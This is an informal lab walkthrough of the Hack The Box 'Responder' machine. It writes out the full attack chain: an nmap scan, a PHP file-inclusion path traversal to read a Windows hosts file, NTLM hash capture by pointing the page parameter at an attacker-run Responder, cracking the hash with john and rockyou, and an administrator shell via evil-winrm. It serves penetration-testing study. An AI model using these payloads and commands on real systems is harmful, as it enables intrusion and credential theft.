Responder     used nmap to scan all ports and found two open http ports 80 and 5985 and an open tcpwrapped(dont what that is) 
we can also see that the server OS is windows 
since its a windows machine we are going to exploit winRM or windows remote management 

website enumeration :   when I put the ip into a web browser its redirecting to another site called http://unika.htb/  - its seems this is because of name-based Virtual Hosting - which means a single host servers multiple websites - so  based on names it will serve the website  

since its a lab and the domain wont be in any dns we need to add in the “/etc/host” file that when we go for  http://unika.htb/  the browser can directly connect to the ip so “/etc/host” is like a mini dns  

now once the website is open when I change the lang to french in the website we can see : http://unika.htb/index.php?page=french.html

and this looks like a file inclusion vulnerablity and we are able to access other files since in as pentester we will go for the etc/hosts file  by using ../ to traverse back to the base directory so we will add “?page=../../../../../../../../windows/system32/drivers/etc/hosts"

So its seems file inclusion is of two types LFI and RFI - local and remote   we are able to get the file so for “page” query params there seems to be no input validation so we conclude they might be using include() in php because it takes all the files 

now will be using Responder to get NTLM hash   we can run responder using  “sudo python3 Responder.py -I tun0” (-I to add the interface)  and when we pass in the page=//{responderip}/{something} in terminal where responder is running we get a hash and we can crack this hash using a tool called john  
“john -w=/Seclists/Passwords/Leaked-Databases/rockyou-75.txt ./Desktop/hash.txt”

now once we get the password we can connect using evil-winRm 

“evil-winrm -i 10.129.136.91 -u administrator -p [REDACTED]” 
